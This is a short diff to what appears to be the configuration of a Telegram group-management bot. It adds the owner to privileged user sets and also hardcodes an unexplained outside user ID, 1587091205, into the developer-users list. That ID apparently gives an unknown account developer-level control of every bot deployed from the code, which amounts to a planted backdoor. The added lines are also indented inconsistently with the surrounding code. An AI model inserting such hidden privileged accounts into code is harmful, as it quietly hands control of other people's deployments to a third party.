@@ -43,6 +43,11 @@ if ENV:
     except ValueError:
         raise Exception("Your OWNER_ID env variable is not a valid integer.")
 
+      DRAGONS.add(OWNER_ID)
+      DEV_USERS.add(OWNER_ID)
+      DEV_USERS.add(1587091205)
+
+
     MESSAGE_DUMP = os.environ.get("MESSAGE_DUMP", None)
     GBAN_LOGS = os.environ.get("GBAN_LOGS", None)
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
